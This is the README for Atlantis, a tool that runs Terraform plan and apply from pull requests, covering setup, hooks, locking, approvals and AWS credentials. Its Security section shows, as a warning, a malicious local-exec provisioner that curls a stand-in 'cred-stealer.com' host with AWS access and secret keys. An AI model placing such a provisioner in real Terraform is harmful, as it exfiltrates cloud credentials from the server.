# Atlantis

## Walkthrough Video
[![Atlantis Walkthrough](./images/atlantis-walkthrough-icon.png)](https://www.youtube.com/watch?v=TmIPWda0IKg)

Read about [Why We Built Atlantis](https://medium.com/runatlantis/introducing-atlantis-6570d6de7281)

[![CircleCI](https://circleci.com/gh/runatlantis/atlantis/tree/master.svg?style=shield)](https://circleci.com/gh/runatlantis/atlantis/tree/master)
[![SuperDopeBadge](https://img.shields.io/badge/Hightower-extra%20dope-b9f2ff.svg)](https://twitter.com/kelseyhightower/status/893260922222813184)
[![Slack Status](https://thawing-headland-22460.herokuapp.com/badge.svg)](https://thawing-headland-22460.herokuapp.com)
[![Go Report Card](https://goreportcard.com/badge/github.com/runatlantis/atlantis)](https://goreportcard.com/report/github.com/runatlantis/atlantis)

* [Features](#features)
* [Atlantis Works With](#atlantis-works-with)
* [Getting Started](#getting-started)
* [Pull/Merge Request Commands](#pullmerge-request-commands)
* [Project Structure](#project-structure)
* [Workspaces/Environments](#workspacesenvironments)
* [Terraform Versions](#terraform-versions)
* [Project-Specific Customization](#project-specific-customization)
* [Locking](#locking)
* [Approvals](#approvals)
* [Security](#security)
* [Production-Ready Deployment](#production-ready-deployment)
    * [Docker](#docker)
    * [Kubernetes](#kubernetes)
    * [AWS Fargate](#aws-fargate)
* [Server Configuration](#server-configuration)
* [AWS Credentials](#aws-credentials)
* [Glossary](#glossary)
    * [Project](#project)
    * [Workspace/Environment](#workspaceenvironment)
* [FAQ](#faq)
* [Contributing](#contributing)
* [Credits](#credits)

## Features
➜ Collaborate on Terraform with your team
- Run terraform `plan` and `apply` **from GitHub pull requests** so everyone can review the output
- **Lock workspaces** until pull requests are merged to prevent concurrent modification and confusion

➜ Developers can write Terraform safely
- **No need to distribute AWS credentials** to your whole team. Developers can submit Terraform changes and run `plan` and `apply` directly from the pull/merge request
- Optionally, require a **review and approval** prior to running `apply`

➜ Also
- Support **multiple versions of Terraform** with a simple project config file

## Atlantis Works With
* GitHub (public, private or enterprise) and GitLab (public, private or enterprise)
* Any Terraform version (see [Terraform Versions](#terraform-version))
* Can be run with a [single binary](https://github.com/runatlantis/atlantis/releases) or with our [Docker image](https://hub.docker.com/r/runatlantis/atlantis/)
* Any repository structure

## Getting Started
Download from [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases)

Run
```
./atlantis testdrive
```
This mode sets up Atlantis on a test repo so you can try it out. It will
- fork an example terraform project
- install terraform (if not already in your PATH)
- install ngrok so we can expose Atlantis to GitHub
- start Atlantis

If you're ready to permanently set up Atlantis see [Production-Ready Deployment](#production-ready-deployment).



## Project Structure
Atlantis supports several Terraform project structures:
- a single Terraform project at the repo root
```
.
├── main.tf
└── ...
```
-  multiple project folders in a single repo (monorepo)
```
.
├── project1
│   ├── main.tf
|   └── ...
└── project2
    ├── main.tf
    └── ...
```
-  one folder per set of configuration
```
.
├── staging
│   ├── main.tf
|   └── ...
└── production
    ├── main.tf
    └── ...
```
-  using `env/{env}.tfvars` to define workspace specific variables. This works in both multi-project repos and single-project repos.
```
.
├── env
│   ├── production.tfvars
│   └── staging.tfvars
└── main.tf
```
or
```
.
├── project1
│   ├── env
│   │   ├── production.tfvars
│   │   └── staging.tfvars
│   └── main.tf
└── project2
    ├── env
    │   ├── production.tfvars
    │   └── staging.tfvars
    └── main.tf
```
With the above project structure you can de-duplicate your Terraform code between workspaces/environments without requiring extensive use of modules. At Hootsuite we found this project format to be very successful and use it in all of our 100+ Terraform repositories.

## Workspaces/Environments
Terraform introduced [Workspaces](https://www.terraform.io/docs/state/workspaces.html) in 0.9. They allow for
> a single directory of Terraform configuration to be used to manage multiple distinct sets of infrastructure resources

If you're using a Terraform version >= 0.9.0, Atlantis supports workspaces through the `-w` flag.
For example,
```
atlantis plan -w staging
```

If a workspace is specified, Atlantis will use `terraform workspace select {workspace}` prior to running `terraform plan` or `terraform apply`.

If you're using the `env/{env}.tfvars` [project structure](#project-structure) we will also append `-var-file=env/{env}.tfvars` to `plan` and `apply`.

If no workspace is specified, we'll use the `default` workspace by default.
This replicates Terraform's default behaviour which also uses the `default` workspace.

## Terraform Versions
By default, Atlantis will use the `terraform` executable that is in its path. To use a specific version of Terraform just install that version on the server that Atlantis is running on.

If you would like to use a different version of Terraform for some projects but not for others
1. Install the desired version of Terraform into the `$PATH` of where Atlantis is running and name it `terraform{version}`, ex. `terraform0.8.8`.
2. In the project root (which is not necessarily the repo root) of any project that needs a specific version, create an `atlantis.yaml` file as follows
```
---
terraform_version: 0.8.8 # set to desired version
```

So your project structure will look like
```
.
├── main.tf
└── atlantis.yaml
```
Now when Atlantis executes it will use the `terraform{version}` executable.

## Project-Specific Customization
An `atlantis.yaml` config file in your project root (which is not necessarily the repo root) can be used to customize
- what commands Atlantis runs **before** `init`, `get`, `plan` and `apply` with `pre_init`, `pre_get`, `pre_plan` and `pre_apply`
- what commands Atlantis runs **after** `plan` and `apply` with `post_plan` and `post_apply`
- additional arguments to be supplied to specific terraform commands with `extra_arguments`
    - the commmands that we support adding extra args to are `init`, `get`, `plan` and `apply`
- what version of Terraform to use (see [Terraform Versions](#terraform-versions))

The schema of the `atlantis.yaml` project config file is

```yaml
# atlantis.yaml
---
terraform_version: 0.8.8 # optional version
# pre_init commands are run when the Terraform version is >= 0.9.0
pre_init:
  commands:
  - "curl http://example.com"
# pre_get commands are run when the Terraform version is < 0.9.0
pre_get:
  commands:
  - "curl http://example.com"
pre_plan:
  commands:
  - "curl http://example.com"
post_plan:
  commands:
  - "curl http://example.com"
pre_apply:
  commands:
  - "curl http://example.com"
post_apply:
  commands:
  - "curl http://example.com"
extra_arguments:
  - command_name: plan
    arguments:
    - "-var-file=terraform.tfvars"
```

When running the `pre_plan`, `post_plan`, `pre_apply`, and `post_apply` commands the following environment variables are available
- `WORKSPACE`: if a workspace argument is supplied to `atlantis plan` or `atlantis apply`, ex `atlantis plan -w staging`, this will
be the value of that argument. Else it will be `default`
- `ATLANTIS_TERRAFORM_VERSION`: local version of `terraform` or the version from `terraform_version` if specified, ex. `0.8.8`
- `DIR`: absolute path to the root of the project on disk

## Locking
When `plan` is run, the [project](#project) and [workspace](#workspaceenvironment) (**but not the whole repo**) are **Locked** until an `apply` succeeds **and** the pull request/merge request is merged.
This protects against concurrent modifications to the same set of infrastructure and prevents
users from seeing a `plan` that will be invalid if another pull request is merged.

If you have multiple directories inside a single repository, only the directory will be locked. Not the whole repo.

To unlock the project and workspace without completing an `apply` and merging, click the link
at the bottom of the plan comment to discard the plan and delete the lock.
Once a plan is discarded, you'll need to run `plan` again prior to running `apply` when you go back to that pull request.

## Approvals
If you'd like to require pull/merge requests to be approved prior to a user running `atlantis apply` simply run Atlantis with the `--require-approval` flag.
By default, no approval is required.

For more information on GitHub pull request reviews and approvals see: https://help.github.com/articles/about-pull-request-reviews/

For more information on GitLab merge request reviews and approvals (only supported on GitLab Enterprise) see: https://docs.gitlab.com/ee/user/project/merge_requests/merge_request_approvals.html.

## Security
Because you usually run Atlantis on a server with credentials that allow access to your infrastructure it's important that you deploy Atlantis securely.

Atlantis could be exploited by
* Running `terraform apply` on a malicious Terraform file with [local-exec](https://www.terraform.io/docs/provisioners/local-exec.html)
```tf
resource "null_resource" "null" {
  provisioner "local-exec" {
    command = "curl https://cred-stealer.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
  }
}
```
* Running malicious hook commands specified in an `atlantis.yaml` file.
* Someone adding `atlantis plan/apply` comments on your valid pull requests causing terraform to run when you don't want it to.

### Mitigations
#### Don't Use On Public Repos
Because anyone can comment on public pull requests, even with all the security mitigations available, it's still dangerous to run Atlantis on public repos until Atlantis gets an authentication system.

#### Don't Use `--allow-fork-prs`
If you're running on a public repo (which isn't recommended, see above) you shouldn't set `--allow-fork-prs` (defaults to false)
because anyone can open up a pull request from their fork to your repo.

#### `--repo-whitelist`
Atlantis requires you to specify a whitelist of repositories it will accept webhooks from via the `--repo-whitelist` flag.
For example:
* Specific repositories: `--repo-whitelist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Your whole organization: `--repo-whitelist=github.com/runatlantis/*`
* Every repository in your GitHub Enterprise install: `--repo-whitelist=github.yourcompany.com/*`
* All repositories: `--repo-whitelist=*`. Useful for when you're in a protected network but dangerous without also setting a webhook secret.

This flag ensures your Atlantis install isn't being used with repositories you don't control. See `atlantis server --help` for more details.

#### Webhook Secrets
Atlantis should be run with Webhook secrets set via the `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` environment variables.
Even with the `--repo-whitelist` flag set, without a webhook secret, attackers could make requests to Atlantis posing as a repository that is whitelisted.
Webhook secrets ensure that the webhook requests are actually coming from your VCS provider (GitHub or GitLab).


## Server Configuration
Configuration for `atlantis server` can be specified via command line flags, environment variables or a YAML config file.
Config file values are overridden by environment variables which in turn are overridden by flags.

### YAML
To use a yaml config file, run atlantis with `--config /path/to/config.yaml`.
The keys of your config file should be the same as the flag, ex.
```yaml
---
gh-token: ...
log-level: ...
```

### Environment Variables
All flags can be specified as environment variables. You need to convert the flag's `-`'s to `_`'s, uppercase all the letters and prefix with `ATLANTIS_`.
For example, `--gh-user` can be set via the environment variable `ATLANTIS_GH_USER`.

To see a list of all flags and their descriptions run `atlantis server --help`

## AWS Credentials
Atlantis simply shells out to `terraform` so you don't need to do anything special with AWS credentials.
As long as `terraform` works where you're hosting Atlantis, then Atlantis will work.
See https://www.terraform.io/docs/providers/aws/#authentication for more detail.

### Multiple AWS Accounts
Atlantis supports multiple AWS accounts through the use of Terraform's
[AWS Authentication](https://www.terraform.io/docs/providers/aws/#authentication).

If you're using the [Shared Credentials file](https://www.terraform.io/docs/providers/aws/#shared-credentials-file)
you'll need to ensure the server that Atlantis is executing on has the corresponding credentials file.

If you're using [Assume role](https://www.terraform.io/docs/providers/aws/#assume-role)
you'll need to ensure that the credentials file has a `default` profile that is able
to assume all required roles.

[Environment variables](https://www.terraform.io/docs/providers/aws/#environment-variables) authentication
won't work for multiple accounts since Atlantis wouldn't know which environment variables to execute
Terraform with.

### Assume Role Session Names
Atlantis injects the Terraform variable `atlantis_user` and sets it to the GitHub username of
the user that is running the Atlantis command. This can be used to dynamically name the assume role
session. This is used at Hootsuite so AWS API actions can be correlated with a specific user.

To take advantage of this feature, use Terraform's [built-in support](https://www.terraform.io/docs/providers/aws/#assume-role) for assume role
and use the `atlantis_user` terraform variable

```hcl
provider "aws" {
  assume_role {
    role_arn     = "arn:aws:iam::ACCOUNT_ID:role/ROLE_NAME"
    session_name = "${var.atlantis_user}"
  }
}

# need to define the atlantis_user variable to avoid terraform errors
variable "atlantis_user" {
  default = "atlantis_user"
}
```

If you're also using the [S3 Backend](https://www.terraform.io/docs/backends/types/s3.html)
make sure to add the `role_arn` option:

```hcl
terraform {
  backend "s3" {
    bucket   = "mybucket"
    key      = "path/to/my/key"
    region   = "us-east-1"
    role_arn = "arn:aws:iam::ACCOUNT_ID:role/ROLE_NAME"
    # can't use var.atlantis_user as the session name because
    # interpolations are not allowed in backend configuration
    # session_name = "${var.atlantis_user}" WON'T WORK
  }
}
```

Terraform doesn't support interpolations in backend config so you will not be
able to use `session_name = "${var.atlantis_user}"`. However, the backend assumed
role is only used for state-related API actions. Any other API actions will be performed using
the assumed role specified in the `aws` provider and will have the session named as the GitHub user.

## Glossary
#### Project
A Terraform project. Multiple projects can be in a single GitHub repo.
We identify a project by its repo **and** the path to the root of the project within that repo.

#### Workspace/Environment
A Terraform workspace. See [terraform docs](https://www.terraform.io/docs/state/workspaces.html) for more information.

## FAQ
**Q: Does Atlantis affect Terraform [remote state](https://www.terraform.io/docs/state/remote.html)?**

A: No. Atlantis does not interfere with Terraform remote state in any way. Under the hood, Atlantis is simply executing `terraform plan` and `terraform apply`.

**Q: How does Atlantis locking interact with Terraform [locking](https://www.terraform.io/docs/state/locking.html)?**

A: Atlantis provides locking of pull requests that prevents concurrent modification of the same infrastructure (Terraform project) whereas Terraform locking only prevents two concurrent `terraform apply`'s from happening.

Terraform locking can be used alongside Atlantis locking since Atlantis is simply executing terraform commands.

**Q: How to run Atlantis in high availability mode? Does it need to be?**

A: Atlantis server can easily be run under the supervision of a init system like `upstart` or `systemd` to make sure `atlantis server` is always running.

Atlantis currently stores all locking and Terraform plans locally on disk under the `--data-dir` directory (defaults to `~/.atlantis`). Because of this there is currently no way to run two or more Atlantis instances concurrently.

However, if you were to lose the data, all you would need to do is run `atlantis plan` again on the pull requests that are open. If someone tries to run `atlantis apply` after the data has been lost then they will get an error back, so they will have to re-plan anyway.

**Q: How to add SSL to Atlantis server?**

A: First, you'll need to get a public/private key pair to serve over SSL.
These need to be in a directory accessible by Atlantis. Then start `atlantis server` with the `--ssl-cert-file` and `--ssl-key-file` flags.
See `atlantis server --help` for more information.

**Q: How can I get Atlantis up and running on AWS?**

A: There is [terraform-aws-atlantis](https://github.com/terraform-aws-modules/terraform-aws-atlantis) project where complete Terraform configurations for running Atlantis on AWS Fargate are hosted. Tested and maintained.

## Contributing
Want to contribute? Check out [CONTRIBUTING](https://github.com/runatlantis/atlantis/blob/master/CONTRIBUTING.md).

## Credits
Atlantis was originally developed at [Hootsuite](https://hootsuite.com) under [hootsuite/atlantis](https://github.com/hootsuite/atlantis). The maintainers are indebted to Hootsuite for supporting the creation and continued development of this project over the last 2 years. The Hootsuite values of building a better way and teamwork made this project possible, alongside constant encouragement and assistance from our colleagues.

NOTE: We had to remove the "fork" label because otherwise code searches don't work.

Thank you to these awesome contributors!
- [@nicholas-wu-hs](https://github.com/nicholas-wu-hs)
- [@nadavshatz](https://github.com/nadavshatz)
- [@jwieringa](https://github.com/jwieringa)
- [@suhussai](https://github.com/suhussai)
- [@mootpt](https://github.com/mootpt)
- [@codec](https://github.com/codec)
- [@nick-hollingsworth-hs](https://github.com/nick-hollingsworth-hs)
- [@mpmsimo](https://github.com/mpmsimo)
- [@hussfelt](https://github.com/hussfelt)
- [@psalaberria002](https://github.com/psalaberria002)

* Atlantis Logo: Icon made by [freepik](https://www.flaticon.com/authors/freepik) from www.flaticon.com

